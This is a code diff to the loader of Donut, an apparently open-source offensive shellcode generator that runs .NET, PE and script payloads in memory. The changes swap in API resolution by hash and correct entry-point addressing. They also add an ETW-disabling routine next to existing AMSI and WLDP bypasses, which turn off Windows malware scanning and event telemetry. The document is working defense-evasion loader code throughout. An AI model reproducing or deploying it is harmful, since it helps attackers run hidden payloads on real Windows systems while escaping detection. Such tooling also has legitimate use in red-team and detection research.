@@ -41,12 +41,16 @@ HANDLE DonutLoader(PDONUT_INSTANCE inst) {
     ULONG64            hash;
     HANDLE             h = NULL;
     CONTEXT            c;
+    LPVOID             host;
+    
+    DPRINT("sizeof(DONUT_INSTANCE)        : %zu\n", sizeof(DONUT_INSTANCE));
+    DPRINT("offsetof(DONUT_INSTANCE, api) : %zu\n", offsetof(DONUT_INSTANCE, api));
     
     // create thread and execute original entrypoint?
     if(inst->oep != 0) {
       DPRINT("Resolving address of CreateThread");
       hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.CreateThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _CreateThread = (CreateThread_t)xGetProcAddress(inst, hash, inst->iv);
+      _CreateThread = (CreateThread_t)xGetProcAddressByHash(inst, hash, inst->iv);
       
       // api resolved?
       if(_CreateThread != NULL) {
@@ -60,24 +64,27 @@ HANDLE DonutLoader(PDONUT_INSTANCE inst) {
       
       DPRINT("Resolving address of NtContinue");
       hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.NtContinue) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _NtContinue = (NtContinue_t)xGetProcAddress(inst, hash, inst->iv);
+      _NtContinue = (NtContinue_t)xGetProcAddressByHash(inst, hash, inst->iv);
       
       DPRINT("Resolving address of GetThreadContext");
       hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetThreadContext) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _GetThreadContext = (GetThreadContext_t)xGetProcAddress(inst, hash, inst->iv);
+      _GetThreadContext = (GetThreadContext_t)xGetProcAddressByHash(inst, hash, inst->iv);
 
       DPRINT("Resolving address of GetCurrentThread");
       hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.GetCurrentThread) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
-      _GetCurrentThread = (GetCurrentThread_t)xGetProcAddress(inst, hash, inst->iv);
+      _GetCurrentThread = (GetCurrentThread_t)xGetProcAddressByHash(inst, hash, inst->iv);
+
+      // get the base address of the host process's executable
+      host = inst->api.GetModuleHandle(NULL);
       
       if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
         c.ContextFlags = CONTEXT_FULL;
         _GetThreadContext(_GetCurrentThread(), &c);
         #ifdef _WIN64
-          c.Rip = inst->oep;
+          c.Rip = RVA2VA(DWORD64, host, inst->oep);
           c.Rsp &= -16;
         #else
-          c.Eip = inst->oep;
+          c.Eip = RVA2VA(DWORD64, host, inst->oep);
           c.Esp &= -4;
         #endif
         DPRINT("Calling NtContinue");
@@ -110,17 +117,21 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     
     hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualAlloc) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
     DPRINT("Resolving address for VirtualAlloc() : %" PRIX64, hash);
-    _VirtualAlloc = (VirtualAlloc_t)xGetProcAddress(inst, hash, inst->iv);
+    _VirtualAlloc = (VirtualAlloc_t)xGetProcAddressByHash(inst, hash, inst->iv);
     
     hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.VirtualFree) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
     DPRINT("Resolving address for VirtualFree() : %" PRIX64, hash);
-    _VirtualFree  = (VirtualFree_t) xGetProcAddress(inst, hash,  inst->iv);
+    _VirtualFree  = (VirtualFree_t) xGetProcAddressByHash(inst, hash,  inst->iv);
     
     hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.RtlExitUserProcess) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
     DPRINT("Resolving address for RtlExitUserProcess() : %" PRIX64, hash);
-    _RtlExitUserProcess  = (RtlExitUserProcess_t) xGetProcAddress(inst, hash,  inst->iv);
+    _RtlExitUserProcess  = (RtlExitUserProcess_t) xGetProcAddressByHash(inst, hash,  inst->iv);
     
-    if(_VirtualAlloc == NULL || _VirtualFree == NULL || _RtlExitUserProcess == NULL) {
+    // failed to resolve any?
+    if(_VirtualAlloc       == NULL || 
+       _VirtualFree        == NULL || 
+       _RtlExitUserProcess == NULL) 
+    {
       DPRINT("FAILED!.");
       return -1;
     }
@@ -171,7 +182,7 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     }
     DPRINT("Resolving LoadLibraryA");
     
-    inst->api.addr[0] = xGetProcAddress(inst, inst->api.hash[0], inst->iv);
+    inst->api.addr[0] = xGetProcAddressByHash(inst, inst->api.hash[0], inst->iv);
     if(inst->api.addr[0] == NULL) return -1;
     
     str = (PCHAR)inst->dll_names;
@@ -180,14 +191,13 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     for(;;) {
       // store string until null byte or semi-colon encountered
       for(i=0; str[i] != '\0' && str[i] !=';' && i<MAX_PATH; i++) path[i] = str[i];
-      // nothing stored? end
+      // nothing stored? exit loop
       if(i == 0) break;
       // skip name plus one for separator
       str += (i + 1);
       // store null terminator
       path[i] = '\0';
-      DPRINT("Loading %s", path);
-      inst->api.LoadLibraryA(path);
+      xGetLibAddress(inst, path);
     }
     
     DPRINT("Resolving %i API", inst->api_cnt);
@@ -195,10 +205,20 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
     for(i=1; i<inst->api_cnt; i++) {
       DPRINT("Resolving API address for %016llX", inst->api.hash[i]);
         
-      inst->api.addr[i] = xGetProcAddress(inst, inst->api.hash[i], inst->iv);
+      inst->api.addr[i] = xGetProcAddressByHash(inst, inst->api.hash[i], inst->iv);
       
+      // if resolving API failed
       if(inst->api.addr[i] == NULL) {
-        DPRINT("Failed to resolve API");
+        DPRINT("Failed to resolve an API");
+        // make an exception for CLRCreateInstance
+        // for older versions of dotnet
+        hash = inst->api.hash[ (offsetof(DONUT_INSTANCE, api.CLRCreateInstance) - offsetof(DONUT_INSTANCE, api)) / sizeof(ULONG_PTR)];
+        
+        if(inst->api.hash[i] == hash) {
+          DPRINT("CLRCreateInstance isn't available. Will try CorBindToRuntime.");
+          continue;
+        }
+        // else, bail out
         goto erase_memory;
       }
     }
@@ -219,7 +239,7 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       mod = (PDONUT_MODULE)&inst->module.x;
     }
     
-    // try bypassing AMSI and WLDP?
+    // try bypassing AMSI, WLDP, and ETW?
     if(inst->bypass != DONUT_BYPASS_NONE) {
       // Try to disable AMSI
       disabled = DisableAMSI(inst);
@@ -232,6 +252,12 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       DPRINT("DisableWLDP %s", disabled ? "OK" : "FAILED");
       if(!disabled && inst->bypass == DONUT_BYPASS_ABORT) 
         goto erase_memory;
+
+      // Try to disable ETW
+      disabled = DisableETW(inst);
+      DPRINT("DisableETW %s", disabled ? "OK" : "FAILED");
+      if (!disabled && inst->bypass == DONUT_BYPASS_ABORT)
+          goto erase_memory;
     }
     
     // module is compressed?
@@ -243,7 +269,7 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       
       // allocate memory for module information + size of decompressed data
       unpck = (PDONUT_MODULE)_VirtualAlloc(
-        NULL, ((sizeof(DONUT_MODULE) + mod->len) -4096) + 4096, 
+        NULL, ((sizeof(DONUT_MODULE) + mod->len) + 4095) & -4096, 
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         
       if(unpck == NULL) goto erase_memory;
@@ -256,33 +282,16 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
       DPRINT("Decompressing %"PRId32 " -> %"PRId32, mod->zlen, mod->len);
       
       if(mod->compress == DONUT_COMPRESS_LZNT1  ||
-         mod->compress == DONUT_COMPRESS_XPRESS ||
-         mod->compress == DONUT_COMPRESS_XPRESS_HUFF)
+         mod->compress == DONUT_COMPRESS_XPRESS)
       {
-        nts = inst->api.RtlGetCompressionWorkSpaceSize(
-          (mod->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, &wspace, &fspace);
-      
-        if(nts != 0) {
-          DPRINT("RtlGetCompressionWorkSpaceSize failed with %"PRIX32, nts);
-          goto erase_memory;
-        }
-        
-        DPRINT("WorkSpace size : %"PRId32" | Fragment size : %"PRId32, wspace, fspace);
-        
-        //ws = (PDONUT_MODULE)_VirtualAlloc(
-        //  NULL, wspace, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        
         DPRINT("Decompressing with RtlDecompressBuffer(%s)",
-          mod->compress == DONUT_COMPRESS_LZNT1 ? "LZNT" : 
-          mod->compress == DONUT_COMPRESS_XPRESS ? "XPRESS" : "XPRESS HUFFMAN");
+          mod->compress == DONUT_COMPRESS_LZNT1 ? "LZNT" : "XPRESS");
                 
         nts = inst->api.RtlDecompressBuffer(
               (mod->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
               (PUCHAR)unpck->data, mod->len, 
               (PUCHAR)&mod->data, mod->zlen, &len);
               
-        //_VirtualFree(ws, 0, MEM_RELEASE | MEM_DECOMMIT);
-      
         if(nts == 0) {
           // assign pointer to mod
           mod = unpck;
@@ -320,6 +329,14 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
        mod->type == DONUT_MODULE_JS)
     {
       RunScript(inst, mod);
+    }
+
+    // if user specified to block instead of exit, then block infinitely before cleanup
+    if (inst->exit_opt == DONUT_OPT_EXIT_BLOCK) {
+      DPRINT("Execution complete. Blocking indefintely.");
+      for (int x = 0; ; x--) {
+        x += 1;
+      }
     }
     
 erase_memory:
@@ -368,7 +385,7 @@ int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[DONUT_MAX_NAME
 #include "inmem_pe.c"        // Unmanaged PE/DLL files
 #include "inmem_script.c"    // VBS/JS files
 
-#include "bypass.c"          // Bypass AMSI and WLDP
+#include "bypass.c"          // Bypass AMSI,WLDP, and ETW
 #include "getpc.c"           // code stub to return program counter (always at the end!)
 
 // the following code is *only* for development purposes
@@ -433,6 +450,8 @@ int main(int argc, char *argv[]) {
       VirtualFree((LPVOID)inst, 0, MEM_DECOMMIT | MEM_RELEASE);
     }
     fclose(fd);
+
+    system("pause");
     return 0;
 }
 #endif
